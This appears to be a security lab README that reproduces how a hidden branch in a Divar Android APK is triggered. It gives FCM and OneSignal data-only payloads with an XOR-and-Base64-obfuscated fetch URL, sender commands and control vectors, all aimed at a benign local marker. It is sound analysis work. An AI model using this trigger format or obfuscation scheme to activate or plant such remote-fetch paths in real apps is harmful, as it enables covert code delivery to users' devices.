# Cloud push vectors for the 11.14.20-b handler lab

These are **fixed, benign FCM data-only messages** for the synthetic app. The field layout and branch conditions come from the preserved Divar `11.14.20-b` APK (SHA-256 `cdaf0bf256269eec249787299b5ebb7058f3944c86b14debfa41f9c263ad17da`). They are test inputs, not recovered attacker notifications. The lab uses the original handler's decision path; its downstream worker serves only a harmless local marker.

For a fresh cloud setup, register Android package `org.hamidk.divarpushlab` in your Firebase project, place its downloaded `google-services.json` in `app/` (it is ignored by Git), and build/install the app on a Google Play services emulator. Enable FCM sending and use a `gcloud` account with `cloudmessaging.messages.create` permission. Start `python3 tools/marker_server.py`, open the app to register its FCM token, then send a vector:

```sh
python3 tools/send_cloud_sample.py --project YOUR_FIREBASE_PROJECT_ID accepted
python3 tools/send_cloud_sample.py --project YOUR_FIREBASE_PROJECT_ID title-mismatch
python3 tools/send_cloud_sample.py --project YOUR_FIREBASE_PROJECT_ID onesignal-envelope
python3 tools/send_cloud_sample.py --project YOUR_FIREBASE_PROJECT_ID onesignal-envelope-title-mismatch
```

The helper privately reads the emulator app's current FCM registration token through `adb run-as`, obtains a short-lived `gcloud` OAuth token, and sends a fixed message. This legacy token mode is used so OneSignal 3.15.3 can register on the same test installation. It accepts no URL, receiver class, or body from the command line. `--validate-only` asks FCM to check the request schema **without delivery**. API acceptance alone does not prove device receipt; inspect the app and marker-server logs.

## Accepted FCM request

`POST https://fcm.googleapis.com/v1/projects/<YOUR_FIREBASE_PROJECT_ID>/messages:send` with `Authorization: Bearer <SHORT_LIVED_OAUTH_TOKEN>` and `Content-Type: application/json`:

```json
{
  "message": {
    "token": "<REGISTERED_FCM_TOKEN>",
    "data": {
      "source": "divar",
      "title": "divar-lab-push",
      "push_id": "divar-lab-push",
      "body": "{\"callback_url\":\"present-but-not-fetched\",\"campaign\":\"ABwcGFJHR1lYRlhGWkZaUllQX15dRwUJGgMNGg==\",\"action\":\"ir.divar.chat.notification.provider.ChatPushNotificationOpenHandler\"}"
    },
    "android": { "priority": "HIGH" }
  }
}
```

| Field | What the original path does |
| --- | --- |
| `message.token` | FCM delivery target for this emulator installation; it is outside Divar's handler logic. Keep it out of published captures. |
| `source` | The Divar FCM adapter forwards `divar` and `default` to the notification provider. Other values do not enter this provider path. |
| `title`, `push_id` | The inserted branch requires a **nonempty, exact string match**. It does not trim or normalize either string. |
| `body` | A JSON **string** in the FCM data map, rather than a nested FCM object. The provider parses it only after the title check. |
| `callback_url` | Must be nonempty. Its value is **not** the worker's fetch URL; this sentinel makes that distinction visible. |
| `campaign` | `Base64(XOR each UTF-8 byte with 0x68)` of the fixed `http://10.0.2.2:18765/marker` URL. The provider uses this string as the explicit Intent's URI and as both its extra key and value. The receiver checks that equality, then passes the string to the worker for decoding. |
| `action` | Class name selected as the explicit broadcast target. This sample names the lab's `ChatPushNotificationOpenHandler`. The original provider checks only that this field is nonempty. |
| `android.priority` | FCM delivery hint, not a handler guard or a guarantee of immediate delivery. |

**Timing:** The provider sends the broadcast while processing the push. The receiver starts the worker from that broadcast; **no notification tap is part of this branch**. Do not expect a visible Android notification to be the trigger. The lab's fixed local server returns a benign marker and cannot provide code or choose another destination.

## OneSignal envelope through direct FCM

`onesignal-envelope` sends a **data-only FCM message directly to the emulator**, shaped like the OneSignal 3.15.3 SDK's incoming envelope. Its `data` map has no `source` field:

```json
{
  "custom": "{\"i\":\"<FRESH_UUID>\",\"a\":{\"push_id\":\"divar-lab-push\"}}",
  "title": "divar-lab-push",
  "alert": "{\"callback_url\":\"present-but-not-fetched\",\"campaign\":\"ABwcGFJHR1lYRlhGWkZaUllQX15dRwUJGgMNGg==\",\"action\":\"ir.divar.chat.notification.provider.ChatPushNotificationOpenHandler\"}"
}
```

The helper generates a fresh UUID for `custom.i` on every send. The SDK parses `custom.a` as provider data and passes `title` and `alert` to the extender. In the 4 October 2026 live test, this route reached the shared provider, receiver, and fixed marker [on push receipt](onesignal_envelope_receipt_log.txt). **It did not use OneSignal's dashboard or message API to send the push.**

`onesignal-envelope-title-mismatch` changes only the handler-relevant `title` to `different-title`; `custom.i` still receives a fresh UUID on each send. In the live control, the SDK extender received it, but the inserted branch [did not dispatch](onesignal_envelope_title_mismatch_log.txt) and the marker server saw no request.

## Fixed control vectors

All commands retain the accepted request except for the stated change. “No relay” means the inserted broadcast/worker branch is not taken; the original app can still continue through ordinary notification handling.

| Sample name | Change | Expected boundary |
| --- | --- | --- |
| `accepted` | Request shown above | FCM adapter → provider relay → matching receiver → lab marker. |
| `default-source` | `source = "default"` | Same relay; this is the adapter's other accepted value. |
| `extra-field` | Add unrelated FCM data field | Same relay; the original handler does **not** require an exact field count. |
| `wrong-source` | `source = "other"` | FCM adapter does not forward to this provider. |
| `title-mismatch` | `title` differs from `push_id` | Provider does not enter inserted relay branch. |
| `empty-title` | Both `title` and `push_id` are empty | Equality alone is insufficient; no relay. |
| `missing-push-id` | Omit `push_id` | Nonempty title cannot match the default empty value; no relay. |
| `malformed-body` | `body = "{not-json"` | JSON parse fails; no relay. |
| `missing-callback-url` | Omit `callback_url` from body JSON | Empty/missing guard; no relay. |
| `missing-campaign` | Omit `campaign` from body JSON | Empty/missing guard; no relay. |
| `missing-action` | Omit `action` from body JSON | Empty/missing guard; no relay. |

Run any vector with `python3 tools/send_cloud_sample.py --project YOUR_FIREBASE_PROJECT_ID SAMPLE_NAME`. The `onesignal-envelope` sample above is a separate SDK entry route; it is not one of the Divar FCM adapter controls in this table. No historical OneSignal delivery, original Divar installation, or post-fetch malicious behavior is established by these FCM vectors.

## OneSignal test-app route

The APK's legacy OneSignal extender parses provider data from `custom.a`, body from `alert`, and title from `title`, then calls the same provider. For a fresh OneSignal app connected to the lab Firebase project, set `ONESIGNAL_API_KEY` privately and run `python3 tools/send_onesignal_sample.py accepted` or `python3 tools/send_onesignal_sample.py title-mismatch`. The helper reads `app_id` from ignored `app/onesignal.properties` and the lab app's own test subscription ID and subscription state from its private preferences; it refuses to send until the app records a subscribed state and a nonempty OneSignal push token. Neither ID is a command-line target. It sends only these two fixed vectors.

The accepted REST request is `POST https://api.onesignal.com/notifications` with `Authorization: Key <TEST_APP_REST_API_KEY>` and `Content-Type: application/json; charset=utf-8`:

```json
{
  "app_id": "<FRESH_ONESIGNAL_APP_ID>",
  "target_channel": "push",
  "include_subscription_ids": ["<LAB_SUBSCRIPTION_ID>"],
  "headings": {"en": "divar-lab-push"},
  "contents": {
    "en": "{\"callback_url\":\"present-but-not-fetched\",\"campaign\":\"ABwcGFJHR1lYRlhGWkZaUllQX15dRwUJGgMNGg==\",\"action\":\"ir.divar.chat.notification.provider.ChatPushNotificationOpenHandler\"}"
  },
  "data": {"push_id": "divar-lab-push"}
}
```

The `title-mismatch` vector changes only `headings.en` to `different-title`. OneSignal should wrap `data` into `custom.a` and localize `headings`/`contents` into the wire `title`/`alert`; **confirm that mapping in a message sent by the OneSignal test app before claiming live OneSignal delivery**. The direct FCM envelope test above confirms SDK handling of those fields, but does not test the OneSignal sender or its FCM credentials. The sender's API acknowledgement alone proves neither subscription delivery nor extender execution. A OneSignal-originated message does not need FCM's `source` field. See [OneSignal's message API](https://documentation.onesignal.com/reference/create-message) and [Android FCM credential setup](https://documentation.onesignal.com/docs/en/android-firebase-credentials).

[Firebase's receive guide](https://firebase.google.com/docs/cloud-messaging/android/receive-messages) explains why these use **data-only** FCM messages: a top-level `notification` message can follow a system-tray path while the app is in the background. [HTTP v1 authorization](https://firebase.google.com/docs/cloud-messaging/send/v1-api) and the [message schema](https://firebase.google.com/docs/reference/fcm/rest/v1/projects.messages) cover transport and targeting.
